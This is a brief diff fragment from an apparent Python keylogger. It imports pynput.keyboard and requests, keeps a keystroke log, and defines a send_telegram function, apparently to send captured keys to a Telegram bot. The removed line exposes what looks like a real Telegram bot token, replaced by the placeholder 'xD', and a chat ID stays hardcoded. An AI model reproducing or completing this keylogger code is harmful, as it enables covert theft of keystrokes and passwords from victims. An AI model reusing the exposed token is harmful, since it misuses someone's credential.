@@ -4,7 +4,7 @@ import pynput.keyboard
 import threading 
 import requests
 log = ""
-TOKEN="7693769656:AAGvxNDtRvwipX7yHFyUsqc_AtZaoqS_OhE"
+TOKEN="xD"
 CHAT_ID="7796337180"
 
 def send_telegram(msg):
